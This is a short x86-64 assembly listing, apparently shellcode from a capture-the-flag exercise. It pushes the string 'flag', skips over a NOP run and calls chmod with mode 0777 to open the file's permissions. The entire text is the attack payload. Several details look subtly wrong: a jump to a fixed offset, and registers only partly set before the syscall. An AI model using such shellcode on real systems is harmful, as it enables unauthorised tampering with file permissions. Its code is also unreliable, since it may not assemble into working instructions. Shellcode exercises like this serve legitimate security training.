section .text
    global _start

_start:
    push 0x67616c66
    mov rdi, rsp
    jmp short 0x0b
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov si, 0x1ff      ; Mode 0777
    mov al, 90         ; chmod syscall = 90
    syscall

